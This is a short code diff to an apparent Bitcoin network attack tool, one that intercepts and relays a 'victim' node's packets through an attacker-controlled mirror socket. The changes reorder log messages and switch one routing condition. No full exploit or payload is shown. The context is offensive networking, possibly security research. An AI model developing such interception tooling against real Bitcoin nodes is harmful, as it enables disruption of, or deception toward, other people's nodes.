@@ -289,7 +289,7 @@ def packet_received(msg_raw, socket, mirror_socket, from_ip, from_port, to_ip, t
 
 	# Relay Bitcoin packets that aren't from the victim
 	if from_ip == victim_ip:
-		print(f'*** Message received ** {msg_type} ** {from_ip} --> {to_ip}')
+		print(f'*** Message received ** {from_ip} --> {to_ip} ** {msg_type}')
 		try:
 			if msg_type == 'ping':
 				pong = msg_pong(bitcoin_protocolversion)
@@ -339,9 +339,8 @@ def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_
 	msg = MsgSerializable.from_bytes(msg_raw)
 
 	# Relay Bitcoin packets that aren't from the victim
-	print(f'MIRROR packet {from_ip}=={attacker_ip}')
-	if from_ip == attacker_ip:
-		print(f'*** Message received ** {msg_type} ** {from_ip} --> {to_ip}')
+	if to_ip == attacker_ip:
+		print(f'*** Mirror message received ** {from_ip} --> {to_ip} ** {msg_type}')
 		try:
 			if msg_type == 'ping':
 				pong = msg_pong(bitcoin_protocolversion)
